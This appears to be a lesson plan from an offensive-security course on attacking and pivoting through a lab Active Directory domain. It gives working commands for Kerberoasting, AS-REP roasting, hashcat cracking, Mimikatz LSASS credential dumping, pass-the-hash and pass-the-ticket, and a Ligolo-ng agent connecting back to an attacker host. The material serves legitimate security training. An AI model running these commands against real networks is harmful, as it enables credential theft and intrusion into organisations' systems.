# Day 10 — Active Directory Attacks & Pivoting

**Date:** Aug 07, 2026
**Week:** Week 2 — Penetration Testing & Offensive Security

---

## 🎯 Overview

Week 2's capstone day: mapping and attacking a live AD environment using yesterday's
Kerberos/LDAP theory, then pivoting deeper into the network from a single compromised
host to reach otherwise-unreachable segments.

## 🐕 BloodHound — Attack Path Mapping

BloodHound ingests AD relationship data (who's a member of what group, who has admin
rights on what computer, who's logged in where) and graphs the **shortest path to Domain
Admin**.

```powershell
# Collection, run from a domain-joined (or authenticated) context
SharpHound.exe -c All
```
```bash
# Analysis, on the attacker machine
neo4j console &            # BloodHound's graph database backend
bloodhound
# import the collected .zip, then run built-in queries like
# "Shortest Paths to Domain Admins"
```
A path like `User A → member of → Group B → has GenericAll on → Computer C (has Domain
Admin logged in)` is a full attack plan, generated automatically from data that's often
just sitting there in a poorly-hardened AD.

## 🍞 Kerberoasting

Any authenticated domain user can request a Kerberos **Service Ticket** for any service
principal name (SPN) — and that ticket is encrypted with the *service account's* NTLM
hash (recall Day 9's Kerberos flow). If the service account has a weak password, the
ticket can be cracked **completely offline**, with zero further contact with the DC.

```bash
GetUserSPNs.py corp.local/lowpriv:password -request
# dumps crackable hashes for every SPN-registered account

hashcat -m 13100 hashes.txt rockyou.txt   # crack offline
```
Service accounts are prime targets because they're often set up once, given a strong
initial password, and then never rotated — but sometimes they aren't strong to begin with.

## 🎫 AS-REP Roasting

Targets accounts with **Kerberos pre-authentication disabled** — for those accounts, the
AS-REP (Day 9's step 2) can be requested *without knowing the password at all*, and it's
encrypted with the user's hash. Same offline-cracking idea as Kerberoasting, but requires
zero valid credentials to begin with.

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

## 🐱 Mimikatz — Credential Dumping

Once you have local admin on a Windows box, Mimikatz can pull plaintext passwords,
hashes, and Kerberos tickets straight out of **LSASS** process memory (where Windows
caches credentials for SSO).

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# dumps NTLM hashes and, if WDigest is enabled, plaintext passwords
```

## ➡️ Lateral Movement

**Pass-the-Hash (PtH):** authenticate to another machine using a captured NTLM hash
directly — no need to ever crack it to plaintext, since NTLM auth works off the hash
itself.
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H <ntlm_hash>
```

**Pass-the-Ticket (PtT):** inject a stolen/forged Kerberos ticket into your current
session to authenticate as that user, no password or hash needed at all.
```
mimikatz # kerberos::ptt ticket.kirbi
```

## 🌉 Pivoting with Ligolo-ng

Once one internal host is compromised, it can become a relay into network segments the
attacker machine can't otherwise reach.

```
# On attacker: start the proxy
ligolo-ng proxy -selfcert

# On compromised host: run the agent, connect back
agent -connect attacker_ip:11601 -ignore-cert

# On attacker proxy console:
session               # select the connected agent
start                 # bring up a tun interface routed through the agent
# now the attacker machine can route traffic into the internal-only subnet
```
This effectively extends the attacker's network reach through the compromised host,
without needing to install anything persistent.

## 🔗 How This Connects

- This day operationalises everything from **Day 9** (Kerberos/LDAP theory) into an actual
  compromise chain.
- Ligolo-ng pivoting here is the same "expand the foothold" logic behind **Day 17**'s
  lateral-movement forensic timelines, viewed from the defender's side.
- BloodHound attack paths mapped here are exactly what a blue team should be hunting for
  in reverse — directly relevant to **Day 20**'s defense phase.

## 📎 Resources

- https://github.com/SpecterOps/BloodHound.git
- https://github.com/fortra/impacket
- https://www.netexec.wiki/getting-started/installation/installation-on-unix

## ✅ Checkpoint / Deliverable

- [ ] BloodHound attack path screenshot from the lab domain, showing shortest path to Domain Admin
- [ ] One cracked Kerberoast or AS-REP hash, with the cracking command and result documented
- [ ] Successful pivot into an internal-only subnet via Ligolo-ng, confirmed with a scan from the attacker machine
